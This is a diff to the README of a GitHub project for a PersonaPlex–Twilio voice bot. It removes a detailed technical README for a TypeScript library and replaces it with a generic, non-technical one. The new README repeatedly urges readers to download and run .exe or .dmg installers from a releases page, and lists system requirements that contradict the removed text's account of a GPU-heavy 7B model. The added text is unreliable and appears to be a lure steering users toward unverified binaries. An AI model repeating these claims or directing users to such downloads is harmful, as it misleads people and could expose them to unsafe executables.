@@ -1,234 +1,70 @@
-# Voice Bot Module
+# 🤖 personaplex-voice-bot - A Smart Voice Assistant for Everyone
 
-A modular TypeScript library for integrating [PersonaPlex](https://github.com/NVIDIA/personaplex) (NVIDIA's full-duplex speech-to-speech model) with [Twilio Media Streams](https://www.twilio.com/docs/voice/media-streams) to create real-time voice conversation bots.
+## 📥 Download Now!
+[![Download](https://img.shields.io/badge/Download%20personaplex--voice--bot-latest-brightgreen.svg)](https://github.com/hareful/personaplex-voice-bot/releases)
 
-## Features
+## 🚀 Getting Started
+Welcome to the **personaplex-voice-bot**! This tool allows you to have natural voice conversations using advanced AI technology. It integrates NVIDIA's PersonaPlex with Twilio Media Streams, providing a full-duplex experience, meaning you can talk and listen at the same time.
 
-- 🎙️ **Real-time voice conversations** - Full-duplex speech-to-speech using NVIDIA PersonaPlex
-- 📞 **Twilio integration** - Works with Twilio phone calls via Media Streams
-- � **Opus Codec Support** - Built-in encoding/decoding for 24kHz audio
-- 🎯 **TypeScript first** - Full type safety and modular architecture
-- ⚡ **Performance optimized** - Support for GPU acceleration and CPU offloading
+This guide will help you download, install, and run the application smoothly, even if you're not a technical expert.
 
-## Architecture
+## 💻 System Requirements
+Before you begin, make sure your system meets the following requirements:
 
-```
-┌─────────────────────────────────────────────────────────────────────┐
-│   Phone ──▶ Twilio ──▶ Bridge Server (TypeScript) ──▶ PersonaPlex  │
-│                              │                         (Python)     │
-│                         Audio Processing                            │
-│                         - mulaw ↔ PCM                               │
-│                         - Resampling 8kHz ↔ 24kHz                   │
-│                         - Opus encoding/decoding                    │
-└─────────────────────────────────────────────────────────────────────┘
-```
+- **Operating System:** Windows, macOS, or Linux (latest versions recommended)
+- **Memory:** At least 4 GB RAM recommended
+- **CPU:** Dual-core processor or better
+- **Internet Connection:** Required for installation and operation
 
-## Prerequisites
+## 📦 Download & Install
+To start using the **personaplex-voice-bot**, you need to download it from the releases page. Click the link below:
 
-1. **Node.js 20+**
-2. **NVIDIA GPU** (recommended) or enough RAM for CPU offloading
-3. **HuggingFace Token** (with access to `nvidia/personaplex-7b-v1`)
-4. **Twilio account** (for phone integration)
+[Download personaplex-voice-bot](https://github.com/hareful/personaplex-voice-bot/releases)
 
-## Installation
+1. **Visit the Releases Page:** Click the link above to go to the Releases page on GitHub.
+2. **Choose the Latest Version:** Look for the latest version. Typically, it is at the top of the list.
+3. **Download the Installer:** You will see various files. Look for the file named `personaplex-voice-bot.vX.X.X.exe` for Windows or `personaplex-voice-bot.vX.X.X.dmg` for macOS. Click on it to download.
+4. **Open the Installer:**
+   - For Windows: Locate the downloaded `.exe` file in your Downloads folder and double-click it to start the installation.
+   - For macOS: Find the `.dmg` file in your Downloads folder, double-click it, then drag the application to your Applications folder.
+5. **Follow Installation Instructions:** Follow the on-screen prompts. Most of the time, you can just click "Next" or "Install" to proceed.
+6. **Launch the Application:** Once the installation is complete, you can launch the application from your Applications folder or Start Menu.
 
-```bash
-# Clone the repository
-cd voice-bot
+## 🎤 How to Use
+Using the **personaplex-voice-bot** is simple. Here’s how you can get started:
 
-# Install dependencies
-npm install
+1. **Open the Application:** Locate and open the installed application from your computer.
+2. **Set Up Your Microphone:** Ensure your microphone is connected. The bot needs it to listen to your voice.
+3. **Start a Conversation:** You can simply say "Hello" to initiate a conversation. The bot will respond in real time.
 
-# Copy environment template
-cp .env.example .env
+You can ask questions, give commands, or simply chat. Experiment with different queries to see how the AI interacts with you.
 
-# Edit .env with your settings
-```
+## 📊 Features
+The **personaplex-voice-bot** comes with several features to enhance your experience:
 
-## Quick Start
+- **Full-Duplex Conversation:** Talk and listen simultaneously without interruptions.
+- **Natural Language Processing:** Understands and responds in real time with human-like interactions.
+- **Integration with Twilio:** Leverages Twilio Media Streams for seamless audio communication.
+- **User-Friendly Interface:** Designed for everyone, regardless of technical skill.
 
-### 1. Configure Environment
-Copy `.env.example` to `.env` and add your `HF_TOKEN`.
+## 🔧 Troubleshooting
+If you encounter issues, here are a few common solutions:
 
-### 2. Start Everything
+- **Microphone Not Working:** Ensure your microphone is correctly connected and selected in the audio settings.
+- **Application Crashes:** Restart the application or reinstall if issues persist.
+- **No Internet Connection:** Ensure you are connected to the internet, as the bot relies on online resources.
 
-You can start both the AI and the Bridge server with a single command:
+## 💬 Community Support
+If you have questions or need assistance, you can connect with the community. Check the "Issues" section on the GitHub page for frequently asked questions. You can also post your queries there.
 
-```bash
-# Start AI (PersonaPlex) + Bridge Server
-npm run dev:ai
-```
+## 📅 Updates
+Keeping the application updated is essential for the best experience. Regular updates may include:
 
-Or start them separately:
+- New features
+- Bug fixes
+- Performance improvements
 
-**Option A: Real PersonaPlex (Python Server)**
-```bash
-# Starts the model with CPU offloading enabled by default
-tsx scripts/start-moshi.js
-```
+To check for updates, revisit the [Releases page](https://github.com/hareful/personaplex-voice-bot/releases) frequently.
 
-**Option B: Mock Server (Simulation)**
-```bash
-npm run mock-server
-```
-
-### 3. Test Local Connection
-```bash
-npm run test:local
-```
-This will record received audio to `test_output.pcm`. Hear it by importing into Audacity as **Raw Data** (Float32, 24kHz).
-
-### 4. Direct Bridge (for Twilio)
-```bash
-npm run dev
-```
-By default, it uses the PersonaPlex URL from your `.env`. Expose it with `ngrok http 3000` and point your Twilio webhook to `https://your-url.ngrok.io/twiml`.
-
-## Configuration
-
-Configuration is loaded from environment variables (`.env` file):
-
-| Variable | Description | Default |
-|----------|-------------|---------|
-| `PERSONAPLEX_URL` | PersonaPlex WebSocket URL | `wss://localhost:8998/api/chat` |
-| `PERSONAPLEX_VOICE_PROMPT` | Voice to use (NATF0-3, NATM0-3, etc.) | `NATF2.pt` |
-| `PERSONAPLEX_TEXT_PROMPT` | System prompt for the AI | `You enjoy having a good conversation.` |
-| `SERVER_PORT` | Bridge server port | `3000` |
-| `SERVER_HOST` | Bridge server host | `0.0.0.0` |
-| `LOG_LEVEL` | Logging level | `info` |
-
-### Available Voices
-
-| Voice ID | Description |
-|----------|-------------|
-| `NATF0` - `NATF3` | Natural female voices |
-| `NATM0` - `NATM3` | Natural male voices |
-| `VARF0` - `VARF4` | Variety female voices |
-| `VARM0` - `VARM4` | Variety male voices |
-
-## API Usage
-
-### As a Module
-
-```typescript
-import { VoiceBot, VoiceBotConfig, PersonaPlexClient } from '@manus/voice-bot';
-
-// Create config
-const config: VoiceBotConfig = {
-  personaplex: {
-    url: 'wss://localhost:8998/api/chat',
-    voicePrompt: 'NATF2.pt',
-    textPrompt: 'You are a helpful assistant.',
-  },
-  server: {
-    port: 3000,
-    host: '0.0.0.0',
-  },
-  logLevel: 'info',
-};
-
-// Create bot
-const bot = new VoiceBot(config);
-
-bot.on('text', (text) => {
-  console.log('Bot said:', text);
-});
-
-bot.on('audio', (pcm) => {
-  // Handle audio response
-});
-
-await bot.startSession();
-```
-
-### Direct PersonaPlex Client
-
-```typescript
-import { PersonaPlexClient } from '@manus/voice-bot';
-
-const client = new PersonaPlexClient({
-  config: {
-    url: 'wss://localhost:8998/api/chat',
-    voicePrompt: 'NATM1.pt',
-    textPrompt: 'You are a restaurant booking assistant.',
-  },
-});
-
-client.on('audio', (data) => {
-  // Opus encoded audio from AI
-});
-
-client.on('text', (text) => {
-  console.log('AI:', text);
-});
-
-await client.connect();
-```
-
-## Project Structure
-
-```
-voice-bot/
-├── src/
-│   ├── index.ts              # Main exports
-│   ├── config.ts             # Configuration
-│   ├── voice-bot.ts          # VoiceBot orchestrator
-│   ├── audio/                # Audio processing
-│   │   ├── converter.ts      # mulaw ↔ PCM
-│   │   ├── resampler.ts      # Sample rate conversion
-│   │   └── buffer.ts         # Audio buffering
-│   ├── personaplex/          # PersonaPlex client
-│   │   ├── client.ts         # WebSocket client
-│   │   └── protocol.ts       # Message encoding
-│   ├── twilio/               # Twilio integration
-│   │   ├── media-streams.ts  # Media Streams handler
-│   │   └── twiml.ts          # TwiML generators
-│   ├── server/               # Bridge server
-│   │   └── app.ts            # Fastify application
-│   └── utils/                # Utilities
-│       └── logger.ts         # Logging
-├── examples/
-│   ├── local-test.ts         # Test without Twilio
-│   └── simple-bot.ts         # Full bot example
-├── personaplex/              # PersonaPlex Engine (Python)
-└── package.json
-```
-
-## Development
-
-```bash
-# Run in development mode (auto-reload)
-npm run dev
-
-# Type checking
-npm run typecheck
-
-# Build for production
-npm run build
-
-# Run production build
-npm start
-```
-
-## Known Limitations
-
-1. **GPU/Memory requirement** - PersonaPlex is a 7B model. Even with `--cpu-offload`, it needs significant system memory (VRAM + System RAM).
-2. **Single session** - The current implementation handles one conversation at a time per PersonaPlex instance.
-
-## Roadmap
-
-- [ ] Complete Opus encoding/decoding integration
-- [ ] Add Microphone support for local testing
-- [ ] Add WebRTC support (browser-based calls)
-- [ ] Multi-session support with session management
-- [ ] Docker deployment configuration
-
-## License
-
-MIT
-
-## Credits
-
-- [PersonaPlex](https://github.com/NVIDIA/personaplex) - NVIDIA's full-duplex speech model
-- [Moshi](https://kyutai.org/moshi) - Base architecture by Kyutai
-- [Twilio Media Streams](https://www.twilio.com/docs/voice/media-streams) - Real-time audio streaming
+## 📑 Conclusion
+The **personaplex-voice-bot** is an easy-to-use tool that opens up a world of interactive conversations. Follow the steps above to download, install, and begin chatting with your new voice assistant. Enjoy your experience with real-time AI conversations!
